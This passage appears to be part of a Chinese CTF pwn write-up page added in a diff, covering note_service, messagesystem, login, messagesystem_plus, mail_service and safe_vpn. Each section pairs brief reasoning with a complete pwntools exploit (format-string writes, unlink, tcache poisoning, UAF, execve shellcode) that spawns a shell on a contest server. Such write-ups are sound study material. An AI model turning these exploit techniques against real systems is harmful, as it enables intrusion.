+</ul>
+<p>这里只演示第一种，基本思路是通过格式化字符串漏洞获取<code>__libc_start_main</code>的地址，从而获取libc基地址，构造<code>one_gadget</code>，然后泄露栈地址，通过gdb调试获取泄露的栈地址与返回地址的偏移值，在通过格式化字符串漏洞的任意地址写功能修改返回地址，获取shell<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./note_service'</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10002</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./note_service'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your name:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your note:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'%41$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your note is:\n'</span>)</span><br><span class="line">ptr = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)[<span class="number">2</span>:],<span class="number">16</span>)<span class="number">-231</span></span><br><span class="line">libc_base = ptr - <span class="number">0x21ab0</span></span><br><span class="line">system = libc_base+<span class="number">0x4f2c5</span></span><br><span class="line">log.info(hex(ptr))</span><br><span class="line">p.recvuntil(<span class="string">'is right????\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'no'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your note:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'%38$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your note is:\n'</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)[<span class="number">2</span>:],<span class="number">16</span>)<span class="number">-496</span>+<span class="number">0x118</span></span><br><span class="line">log.info(hex(ptr))</span><br><span class="line">p.recvuntil(<span class="string">'is right????\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'no'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input your note:\n'</span>)</span><br><span class="line">o1 = (<span class="number">0x100</span>+int(hex(system)[<span class="number">-2</span>:],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">o2 = (<span class="number">0x100</span>-(o1)+int(hex(system)[<span class="number">-4</span>:<span class="number">-2</span>],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">o3 = (<span class="number">0x100</span>-((o1+o2)&amp;<span class="number">0xff</span>)+int(hex(system)[<span class="number">-6</span>:<span class="number">-4</span>],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">o4 = (<span class="number">0x100</span>-((o1+o2+o3)&amp;<span class="number">0xff</span>)+int(hex(system)[<span class="number">-8</span>:<span class="number">-6</span>],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">o5 = (<span class="number">0x100</span>-((o1+o2+o3+o4)&amp;<span class="number">0xff</span>)+int(hex(system)[<span class="number">-10</span>:<span class="number">-8</span>],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">o6 = (<span class="number">0x100</span>-((o1+o2+o3+o4+o5)&amp;<span class="number">0xff</span>)+int(hex(system)[<span class="number">-12</span>:<span class="number">-10</span>],<span class="number">16</span>))&amp;<span class="number">0xff</span></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn%&#123;&#125;c%&#123;&#125;$hhn'</span>.format(o1,<span class="number">18</span>,o2,<span class="number">19</span>,o3,<span class="number">20</span>,o4,<span class="number">21</span>,o5,<span class="number">22</span>,o6,<span class="number">23</span>).ljust(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(stack)+p64(stack+<span class="number">1</span>)+p64(stack+<span class="number">2</span>)+p64(stack+<span class="number">3</span>)+p64(stack+<span class="number">4</span>)+p64(stack+<span class="number">5</span>)</span><br><span class="line">log.info(hex(system))</span><br><span class="line">log.info(hex(stack))</span><br><span class="line">log.info(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'is right????\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="messagesystem"><a href="#messagesystem" class="headerlink" title="messagesystem"></a>messagesystem</h4><p>查看保护机制  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;root&#x2F;ctf&#x2F;messagesystem&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></div>
+
+<p>基本思路是泄露libc基地址，构造fake_chunk，利用unlink机制，实现任意地址读写，修改free@got为system函数，这里还要注意绕过tcache机制<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.binary = <span class="string">'./messagesystem'</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./messagesystem'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./messagesystem'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">(idx,size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter your Message id!(0-15)\n'</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">'How many character do you want to leave?\n'</span>,str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'What do you want to say?\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Which Message do you want to show?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Which Message do you want to delete?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Which Message do you want to edit?\n'</span>,str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Now enter your Message!\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	leave(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">'aaa'</span>)</span><br><span class="line">	leave(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'bbb'</span>)</span><br><span class="line">	leave(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	payload = (p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x601560</span><span class="number">-0x18</span>)+p64(<span class="number">0x601560</span><span class="number">-0x10</span>)).ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">	leave(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		leave(i+<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'aaa'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		delete(i+<span class="number">3</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got)</span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	free_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> hex(free_addr)</span><br><span class="line">	log.info(hex(free_addr))</span><br><span class="line">	libc_base = free_addr<span class="number">-0x97950</span></span><br><span class="line">	system_addr = libc_base+<span class="number">0x4f440</span></span><br><span class="line">	edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="not-implemented-login-service"><a href="#not-implemented-login-service" class="headerlink" title="not_implemented_login_service"></a>not_implemented_login_service</h4><p>程序没有开启数据段不可执行保护  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;root&#x2F;ctf&#x2F;login&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>
+
+<p>因此基本思路是像数据段输入shellcode，利用栈溢出漏洞修改程序返回地址到shellcode，从而执行恶意代码，获取shell<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    p = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">p.sendlineafter(<span class="string">'input your username:\n'</span>,shellcode)</span><br><span class="line">payload = <span class="string">'pwnht\x00'</span>+<span class="string">'a'</span>*<span class="number">0x12</span>+p64(<span class="number">0x601060</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'input your password:\n'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye bye\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>这里还得要注意绕过密码验证，因此构造payload时，要加上<code>pwnht\x00</code>来绕过密码验证</p>
+<h4 id="messagesystem-plus"><a href="#messagesystem-plus" class="headerlink" title="messagesystem_plus"></a>messagesystem_plus</h4><p>这一题和前一题<code>messagesystem</code>基本相似，就多了个绕过tcache<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.binary = <span class="string">'./messageSystem_plus'</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./messageSystem_plus'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./messageSystem_plus'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">(idx,size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Enter your Message id!(0-15)\n'</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">'How many character do you want to leave?\n'</span>,str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'What do you want to say?\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Which Message do you want to show?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx,*param)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'choice: '</span>,str(idx))</span><br><span class="line">	<span class="keyword">if</span> idx==<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(len(param)):</span><br><span class="line">			p.sendlineafter(<span class="string">'Which Message do you want to delete?\n'</span>,str(param[i]))</span><br><span class="line">		p.sendlineafter(<span class="string">'Which Message do you want to delete?\n'</span>,<span class="string">'-1'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">'Which Message do you want to delete?\n'</span>,str(param[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Which Message do you want to edit?\n'</span>,str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Now enter your Message!\n'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	leave(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">'aaa'</span>)</span><br><span class="line">	leave(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'bbb'</span>)</span><br><span class="line">	leave(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">	delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">	payload = (p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x6017A0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6017A0</span><span class="number">-0x10</span>)).ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">	leave(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		leave(i+<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'aaa'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		delete(<span class="number">2</span>,i+<span class="number">3</span>)</span><br><span class="line">	delete(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">	payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got)</span><br><span class="line">	edit(<span class="number">0</span>,payload)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	free_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> hex(free_addr)</span><br><span class="line">	log.info(hex(free_addr))</span><br><span class="line">	libc_base = free_addr<span class="number">-0x97950</span></span><br><span class="line">	system_addr = libc_base+<span class="number">0x4f440</span></span><br><span class="line">	edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">	delete(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="mail-service"><a href="#mail-service" class="headerlink" title="mail_service"></a>mail_service</h4><p>查看保护机制  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;root&#x2F;ctf&#x2F;mail_service&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div>
+
+<p>这道题的基本思路是，首先通过UAF漏洞获取unsorted_bin的地址，从而泄露libc的基地址。由于每次留下邮件都会创建两个堆。<br>第一个堆是一个结构体,内容如下，大小为0x40  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mail_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> receiver[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">char</span> title[<span class="number">16</span>];</span><br><span class="line">	heap * ptr;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>第二个堆的大小可控，因此我们可以构造一个假的mail_list结构体，free掉它，然后通过修改fd指针修改tcache中的下一个堆块，以至于当我们分配一个新的mail_list结构体堆时，系统会把我们构造假的mail_list结构体分配给程序，此时由于UAF漏洞的存在使得我们可以修改mail_list中指向邮件内容的指针，从而造成任意地址读写。<br>然而由于程序开启了<code>Full RELRO</code>，所以got表不可写，考虑通过libc中的<code>__environ</code>变量泄露栈地址，通过gdb调试确定返回地址的偏移，从而修改返回地址，控制程序流。<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]</span><br><span class="line">context.binary = <span class="string">'./mail_service'</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">	p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10006'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(<span class="string">'./mail_service'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./mail_service'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_mail</span><span class="params">(idx,receiver,title,length,context)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'your choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'your mail index:\n'</span>,str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'input your receiver:\n'</span>)</span><br><span class="line">	p.send(receiver.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'input your title:\n'</span>)</span><br><span class="line">	p.send(title.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'input your mail length:\n'</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">'input your mail context:\n'</span>)</span><br><span class="line">	p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_mail</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'your choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'your mail index:\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_mail</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'your choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'your mail index:\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_mail</span><span class="params">(idx,receiver,title,context)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'your choice:\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'your mail index:\n'</span>,str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'input your receiver:\n'</span>)</span><br><span class="line">	p.send(receiver.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'input your title:\n'</span>)</span><br><span class="line">	p.send(title.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'input your mail context:\n'</span>)</span><br><span class="line">	p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'your choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendafter(<span class="string">'input your name:\n'</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.sendafter(<span class="string">'input your password:\n'</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'your choice:\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendafter(<span class="string">'input your name:\n'</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	p.sendafter(<span class="string">'input your password:\n'</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	add_mail(<span class="number">0</span>,<span class="string">'agx'</span>,<span class="string">'agxaa'</span>,<span class="number">0x30</span>,<span class="string">'agxaaagxaa'</span>)</span><br><span class="line">	add_mail(<span class="number">1</span>,<span class="string">'agx'</span>,<span class="string">'agxaa'</span>,<span class="number">0x80</span>,<span class="string">'agxaa'</span>)</span><br><span class="line">	add_mail(<span class="number">2</span>,<span class="string">'agx'</span>,<span class="string">'agxaa'</span>,<span class="number">0x10</span>,<span class="string">'agxaa'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">		remove_mail(<span class="number">1</span>)</span><br><span class="line">	remove_mail(<span class="number">1</span>)</span><br><span class="line">	show_mail(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'context is: '</span>)</span><br><span class="line">	malloc_hook = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">	log.info(hex(malloc_hook))</span><br><span class="line">	libc_addr = malloc_hook <span class="number">-0x3ebc30</span></span><br><span class="line">	one_gadget = libc_addr+<span class="number">0x4f322</span></span><br><span class="line">	environ = libc_addr+<span class="number">0x3ee098</span></span><br><span class="line">	remove_mail(<span class="number">0</span>)</span><br><span class="line">	show_mail(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'context is: '</span>)</span><br><span class="line">	heap_1 = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	log.info(hex(heap_1))</span><br><span class="line">	add_mail(<span class="number">3</span>,<span class="string">'agx'</span>,<span class="string">'aaaaa'</span>,<span class="number">0x30</span>,<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line">	edit_mail(<span class="number">3</span>,<span class="string">'aaaaaa'</span>,<span class="string">'bbbbbb'</span>,<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">16</span>+p64(environ)+p64(<span class="number">0x200</span>))</span><br><span class="line">	show_mail(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'context is: '</span>)</span><br><span class="line">	stack = u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">	log.info(<span class="string">'stack==&gt;'</span>+hex(stack))</span><br><span class="line">	edit_mail(<span class="number">3</span>,<span class="string">'aaaaaa'</span>,<span class="string">'bbbbbb'</span>,<span class="string">'a'</span>*<span class="number">16</span>+<span class="string">'b'</span>*<span class="number">16</span>+p64(stack<span class="number">-272</span>)+p64(<span class="number">0x200</span>))</span><br><span class="line">	edit_mail(<span class="number">0</span>,<span class="string">'ccc'</span>,<span class="string">'dddd'</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	log.info(<span class="string">'one_gadget==&gt;'</span>+hex(one_gadget))</span><br><span class="line">	p.sendlineafter(<span class="string">'your choice:\n'</span>,<span class="string">'5'</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="safe-vpn"><a href="#safe-vpn" class="headerlink" title="safe_vpn"></a>safe_vpn</h4><p>这道题应该是一道非预期，由于文件指针在读取完之后会指向文件尾，再次读取就会读取到空字符，在该程序中，文件指针没有刷新，因此，我们在读取一次文件后，只要再输入两个空字符就可以获取shell  </p>
